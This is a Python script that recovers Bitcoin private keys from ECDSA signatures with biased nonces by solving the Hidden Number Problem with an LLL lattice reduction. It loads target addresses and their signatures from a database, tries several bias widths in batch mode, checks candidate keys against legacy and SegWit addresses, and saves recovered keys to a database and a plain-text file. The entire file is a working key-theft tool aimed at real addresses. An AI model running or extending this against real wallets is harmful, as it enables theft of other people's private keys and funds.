import hashlib
import requests
import time
import os
import pandas as pd
import re
import base58
from ecdsa import SigningKey, SECP256k1
from db_manager import get_signatures, add_recovered_key, get_target_addresses, mark_analyzed

# --- Simple Bech32 Implementation ---
CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"

def bech32_polymod(values):
    generator = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
    chk = 1
    for value in values:
        top = chk >> 25
        chk = (chk & 0x1ffffff) << 5 ^ value
        for i in range(5):
            chk ^= generator[i] if ((top >> i) & 1) else 0
    return chk

def bech32_hrp_expand(hrp):
    return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]

def bech32_create_checksum(hrp, data):
    values = bech32_hrp_expand(hrp) + data
    polymod = bech32_polymod(values + [0, 0, 0, 0, 0, 0]) ^ 1
    return [(polymod >> 5 * (5 - i)) & 31 for i in range(6)]

def bech32_encode(hrp, data):
    combined = data + bech32_create_checksum(hrp, data)
    return hrp + '1' + ''.join([CHARSET[d] for d in combined])

def convertbits(data, frombits, tobits, pad=True):
    acc = 0
    bits = 0
    ret = []
    maxv = (1 << tobits) - 1
    max_acc = (1 << (frombits + tobits - 1)) - 1
    for value in data:
        if value < 0 or (value >> frombits): return None
        acc = ((acc << frombits) | value) & max_acc
        bits += frombits
        while bits >= tobits:
            bits -= tobits
            ret.append((acc >> bits) & maxv)
    if pad:
        if bits: ret.append((acc << (tobits - bits)) & maxv)
    elif bits >= frombits or ((acc << (tobits - bits)) & maxv):
        return None
    return ret
# --- End of Bech32 ---

# SECP256K1 Curve Order
P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def verify_key(d, address):
    """
    Verifies if a private key 'd' corresponds to the target address.
    Supports Legacy (1...) and SegWit v0 (bc1q...).
    """
    try:
        # Convert to hex string, remove 0x prefix, and pad to 64 chars
        d_hex = hex(int(d))[2:].zfill(64)
        d_bytes = bytes.fromhex(d_hex)
        sk = SigningKey.from_string(d_bytes, curve=SECP256k1)
        vk = sk.verifying_key
        
        # Uncompressed Legacy
        addr_uncompressed = pubkey_to_address(vk.to_string('uncompressed'))
        # Compressed Legacy
        addr_compressed = pubkey_to_address(vk.to_string('compressed'))
        # SegWit v0 (P2WPKH) - always uses compressed pubkey
        addr_segwit = pubkey_to_segwit_address(vk.to_string('compressed'))
        
        return address in [addr_uncompressed, addr_compressed, addr_segwit]
    except Exception as e:
        print(f"Error in verify_key: {e}")
        return False

def pubkey_to_address(pubkey_bytes):
    sha256 = hashlib.sha256(pubkey_bytes).digest()
    ripemd160 = hashlib.new('ripemd160', sha256).digest()
    vh = b'\x00' + ripemd160
    checksum = hashlib.sha256(hashlib.sha256(vh).digest()).digest()[:4]
    return base58.b58encode(vh + checksum).decode()

def pubkey_to_segwit_address(pubkey_bytes):
    sha256 = hashlib.sha256(pubkey_bytes).digest()
    ripemd160 = hashlib.new('ripemd160', sha256).digest()
    converted = convertbits(ripemd160, 8, 5)
    return bech32_encode('bc', [0] + converted)

import mpmath
mpmath.mp.prec = 512

def lll_reduction(basis):
    """
    Standard LLL implementation using mpmath for high precision.
    """
    n = len(basis)
    m = len(basis[0])
    mu = [[mpmath.mpf(0) for _ in range(n)] for _ in range(n)]
    b_star = [[mpmath.mpf(0) for _ in range(m)] for _ in range(n)]
    d = [mpmath.mpf(0)] * n

    def update_orthogonalization(i):
        b_star[i] = [mpmath.mpf(x) for x in basis[i]]
        for j in range(i):
            num = sum(b_star[i][k] * b_star[j][k] for k in range(m))
            mu[i][j] = num / d[j] if d[j] != 0 else mpmath.mpf(0)
            for k in range(m):
                b_star[i][k] -= mu[i][j] * b_star[j][k]
        d[i] = sum(x**2 for x in b_star[i])

    for i in range(n):
        update_orthogonalization(i)

    k = 1
    iteration = 0
    start_time = time.time()
    while k < n:
        iteration += 1
        if time.time() - start_time > 60:
            print("LLL reduction timeout (60s)")
            break
        for j in range(k-1, -1, -1):
            if abs(mu[k][j]) > 0.5:
                q = int(round(mu[k][j]))
                for l in range(m):
                    basis[k][l] -= q * basis[j][l]
                update_orthogonalization(k)
        
        if d[k] >= (0.75 - mu[k][k-1]**2) * d[k-1]:
            k += 1
        else:
            basis[k], basis[k-1] = basis[k-1], basis[k]
            update_orthogonalization(k-1)
            update_orthogonalization(k)
            k = max(k-1, 1)
    return basis

def solve_hnp(sigs_data, bias_bits, address=None):
    # Limit number of signatures to avoid slow LLL reduction
    max_n = 32
    if len(sigs_data) > max_n:
        sigs_data = sigs_data[:max_n]
    
    n = len(sigs_data)
    if n < 2: return None
    B = 2**(256 - bias_bits) 
    matrix = [[0] * (n + 2) for _ in range(n + 2)]
    t_values = []
    u_values = []
    for sig in sigs_data:
        s_inv = pow(sig['s'], -1, P)
        t = (s_inv * sig['r']) % P
        u = (s_inv * sig['z']) % P
        t_values.append(t)
        u_values.append(u)
    for i in range(n): matrix[i][i] = P
    for i in range(n): matrix[n][i] = t_values[i]
    matrix[n][n] = 1 
    for i in range(n): matrix[n+1][i] = u_values[i]
    matrix[n+1][n+1] = B
    
    reduced = lll_reduction(matrix)
    
    # Reduced lattice check
    for row in reduced:
        potential_d = abs(row[n]) 
        if potential_d == 0 or potential_d >= P: continue
        if address:
            if verify_key(potential_d, address): return potential_d
        else:
            if potential_d > 1000: return potential_d
    return None

def run_lattice_recovery(address, bias_bits=8):
    sigs = get_signatures(address)
    if len(sigs) >= 2:
        print(f"Attempting recovery for {address} with {len(sigs)} sigs ({bias_bits} bits)...")
        key = solve_hnp(sigs, bias_bits, address=address)
        if key:
            key_hex = hex(key)[2:].zfill(64)
            print(f"!!! REAL SUCCESS: Key found for {address} !!!")
            print(f"Private Key: {key_hex}")
            add_recovered_key(address, key_hex, method='Lattice')
            with open("keys_recovered.txt", "a") as f:
                f.write(f"Address: {address} | Key: {key_hex}\n")
            return key
    else:
        print(f"Not enough signatures for {address} (need at least 2, have {len(sigs)})")
    return None

def batch_analyze():
    addresses = get_target_addresses(limit=100, only_unprocessed=False)
    print(f"Starting batch analysis for {len(addresses)} addresses...")
    for addr in addresses:
        # Try different bias bits
        for bias in [8, 12, 16, 20]:
            if run_lattice_recovery(addr, bias_bits=bias):
                break # Found the key, move to next address

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 lattice_nonce_analyzer.py <address|batch> [bias_bits]")
        sys.exit(1)
    
    cmd = sys.argv[1]
    if cmd == "batch":
        batch_analyze()
    else:
        address = cmd
        bias_bits = int(sys.argv[2]) if len(sys.argv) > 2 else 8
        print(f"Starting lattice analysis for {address}...")
        run_lattice_recovery(address, bias_bits=bias_bits)
